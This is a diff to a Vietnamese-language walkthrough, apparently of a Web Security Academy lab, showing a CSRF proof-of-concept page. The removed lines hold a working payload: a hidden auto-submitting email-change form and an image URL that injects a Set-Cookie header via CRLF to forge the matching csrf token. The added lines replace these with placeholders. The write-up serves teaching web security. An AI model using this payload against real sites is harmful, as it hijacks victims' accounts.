@@ -28,11 +28,11 @@ Set cookie thành công. Cuối cùng, chúng ta sẽ viết PoC để tấn t�
   <body>
     <h1>Hello World</h1> <!-- Phần được hiển thị-->
     <iframe style="display:none;" name="csrf-iframe"></iframe> <!-- Để ẩn thẻ form khi hiển thị tới nạn nhân -->
-    <form action="https://acda1fd11ec7ab69c04c0c1a007900ec.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
-      <input type="hidden" name="email" value="victimmmm&#64;gmail&#46;com">
-      <input type="hidden" name="csrf" value="cuong" />
+    <form action="URL_nơi_khai_thác_CSRF_ở_trên_trang_web_đó" method="POST" id="csrf-form">
+      <input type="hidden" name="email" value="email_mà_bạn_muốn_đổi">
+      <input type="hidden" name="csrf" value="token_của_người_tấn_công" /> <!-- Phải trùng với giá trị cookie -->
     </form>
-    <img style="display:none;" src="https://acda1fd11ec7ab69c04c0c1a007900ec.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrf=cuong" onerror="document.forms[0].submit()">
+    <img style="display:none;" src="URL_có_chức_năng_ghi_đè_cookie_csrf" onerror="document.forms[0].submit()">
   </body> <!-- Thẻ này để ghi đè cookie csrf-->
 </html>
 ```
